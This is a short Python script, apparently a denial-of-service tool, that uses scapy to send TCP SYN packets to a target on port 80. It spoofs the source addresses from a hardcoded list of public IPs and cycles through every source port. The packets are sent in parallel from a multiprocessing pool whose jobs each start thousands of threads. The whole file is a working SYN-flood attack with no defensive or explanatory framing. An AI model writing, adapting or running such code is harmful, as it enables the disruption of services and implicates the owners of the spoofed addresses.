
import multiprocessing
from concurrent.futures import ThreadPoolExecutor
from scapy.all import *
import random

dst = '0.0.0.0'
dport = 80

def dos(dst, dport):
    ip_pool = ['125.118.72.207', '171.38.42.111', '125.120.206.222', '117.63.8.131', '36.26.104.51',
        '218.20.54.194', '119.28.112.130']
    for sport in range(1024, 65535):
        index = random.randrange(len(ip_pool))
        iplayer = IP(src=ip_pool[index], dst=dst)
        tcplayer = TCP(sport=sport, dport=dport, flags="S")
        packet = iplayer / tcplayer
        send(packet)


def processer():
    mpool = multiprocessing.Pool(10)
    for i in range(1000):
        mpool.apply_async(threader, )
    mpool.close()
    mpool.join()


def threader():
    pool = ThreadPoolExecutor(10000)
    [pool.submit(dos, dst, dport) for i in range(10000)]


processer()

